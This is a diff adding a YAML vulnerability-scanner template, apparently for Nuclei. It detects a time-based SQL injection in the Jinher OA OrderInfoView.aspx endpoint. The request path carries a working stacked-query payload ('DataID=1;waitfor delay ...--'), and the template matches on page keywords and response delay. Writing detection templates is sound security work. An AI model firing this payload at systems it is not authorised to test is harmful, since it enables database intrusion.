@@ -1,0 +1,34 @@
+id: jinher-jhsoft-orderinfoview-aspx-sqli
+info:
+  name: 金和OA OrderInfoView.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in 金和OA OrderInfoView.aspx.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CrmOrder/OrderInfoView.aspx/?DataID=1;waitfor+delay%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "销售单编号"
+          - "合同编号"
+          - "财务信息"
+          - "JHSoft"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t2)"
+          - "duration <= to_number(t3)"
